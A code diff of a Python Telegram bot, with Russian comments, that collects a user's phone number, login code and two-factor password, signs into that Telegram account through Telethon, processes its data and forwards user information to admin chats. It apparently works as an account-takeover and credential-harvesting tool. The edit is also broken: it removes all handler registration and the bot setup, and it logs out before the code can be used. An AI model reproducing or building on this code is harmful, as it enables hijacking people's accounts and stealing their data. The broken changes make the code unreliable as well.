@@ -1,10 +1,12 @@
 import logging
+import asyncio
 import os
 from aiogram import Bot, Dispatcher, types
 from aiogram.utils import executor
 from aiogram.contrib.middlewares.logging import LoggingMiddleware
 from telethon import TelegramClient
 from dotenv import load_dotenv
+from defunc import *
 from telethon.errors import SessionPasswordNeededError
 from datetime import datetime
 
@@ -20,14 +22,12 @@ admin_chat_ids_str = os.getenv("ADMIN_CHAT_IDS")
 allowed_users = [int(user_id) for user_id in allowed_users_str.split(",")]
 admin_chat_ids = [int(chat_id) for chat_id in admin_chat_ids_str.split(",")]
 
-# Создаем TelegramClient и Bot
-client = TelegramClient('session_name', api_id, api_hash)
-bot = Bot(token=bot_token)
-dp = Dispatcher(bot)
-dp.middleware.setup(LoggingMiddleware())
-
 # Логирование
 logging.basicConfig(level=logging.INFO)
+
+# Создаем TelegramClient и Bot
+def create_client():
+    return TelegramClient('session_name', api_id, api_hash)
 
 # Словарь для хранения состояния пользователя
 user_state = {}
@@ -55,24 +55,22 @@ async def send_files_to_bot(bot, admin_chat_ids, user_chat_id):
         await bot.send_message(admin_chat_id, user_info_message)
 
 # Обработчики сообщений
-@dp.message_handler(lambda message: message.from_user.id not in allowed_users)
 async def unauthorized(message: types.Message):
     await message.reply("Извините, вы не авторизованы для использования этого бота.")
 
-@dp.message_handler(commands=['start'])
 async def send_welcome(message: types.Message):
     if message.from_user.id in allowed_users:
-        await message.reply("Добро пожаловать! Пожалуйста, введите ваш номер телефона в международном формате, начиная с '+'.")
+        await message.reply("Добро пожаловать! Пожалуйста, введите ваш номер телефона в международном формате.")
     else:
         await unauthorized(message)
 
-@dp.message_handler(lambda message: message.text and message.text.startswith('+') and message.text[1:].isdigit() and len(message.text) > 10 and message.from_user.id in allowed_users)
 async def get_phone_number(message: types.Message):
     phone_number = message.text
     
     user_state[message.from_user.id] = {'phone_number': phone_number}
     
     try:
+        client = create_client()
         await client.connect()
         
         # Проверка, авторизован ли пользователь
@@ -85,58 +83,55 @@ async def get_phone_number(message: types.Message):
         await message.reply("Код отправлен на ваш номер. Пожалуйста, введите код, который вы получили.")
     except Exception as e:
         await message.reply(f"Произошла ошибка: {e}")
+    finally:
+        await client.log_out()
+        await client.disconnect()
 
-@dp.message_handler(lambda message: 'phone_code_hash' in user_state.get(message.from_user.id, {}))
 async def get_code(message: types.Message):
     code = message.text
     phone_number = user_state[message.from_user.id]['phone_number']
     phone_code_hash = user_state[message.from_user.id]['phone_code_hash']
-    user_chat_id = message.from_user.id
 
     try:
+        client = create_client()
         await client.connect()
-        try:
-            # Проверяем, что пин-код состоит из 5 цифр
-            if len(code) != 5 or not code.isdigit():
-                raise ValueError("Пин-код должен состоять из 5 цифр.")
+        
+        # Проверяем, что пин-код состоит из 5 цифр
+        if len(code) != 5 or not code.isdigit():
+            raise ValueError("Пин-код должен состоять из 5 цифр.")
                 
-            await client.sign_in(phone_number, code, phone_code_hash=phone_code_hash.phone_code_hash)
-        except SessionPasswordNeededError:
-            await message.reply("Необходим пароль двухфакторной аутентификации. Пожалуйста, введите ваш пароль.")
-            user_state[message.from_user.id]['awaiting_password'] = True
-            return
-
+        await client.sign_in(phone_number, code, phone_code_hash=phone_code_hash.phone_code_hash)
+        
         await message.reply("Успешная авторизация!")
-        await process_user_data(client, phone_number, user_chat_id)
+        await process_user_data(client, phone_number, message.from_user.id)
+    except SessionPasswordNeededError:
+        await message.reply("Необходим пароль двухфакторной аутентификации. Пожалуйста, введите ваш пароль.")
+        user_state[message.from_user.id]['awaiting_password'] = True
     except Exception as e:
         await message.reply(f"Произошла ошибка: {e}")
     finally:
         await client.log_out()
         await client.disconnect()
-        user_state.pop(message.from_user.id, None)
 
-@dp.message_handler(lambda message: 'awaiting_password' in user_state.get(message.from_user.id, {}))
 async def process_password(message: types.Message):
     password = message.text
     phone_number = user_state[message.from_user.id]['phone_number']
     phone_code_hash = user_state[message.from_user.id]['phone_code_hash']
-    user_id = message.from_user.id
+
     try:
+        client = create_client()
         await client.connect()
-        
-        # Входим в аккаунт с использованием номера телефона, пин-кода и пароля
         await client.sign_in(phone_number=phone_number, password=password, phone_code_hash=phone_code_hash.phone_code_hash)
-        
-        # Обрабатываем данные пользователя
-        await process_user_data(client, phone_number, user_id)
+        await message.reply("Успешная авторизация!")
+        await process_user_data(client, phone_number, message.from_user.id)
     except Exception as e:
         await message.reply(f"Произошла ошибка: {e}")
     finally:
-        # Разлогиниваемся после завершения
         await client.log_out()
         await client.disconnect()
-        # Удаляем состояние пользователя
         user_state.pop(message.from_user.id, None)
+
+# Функция для обработки данных пользователя
 
 async def process_user_data(client, phone_number, user_id):
     selection = '0'
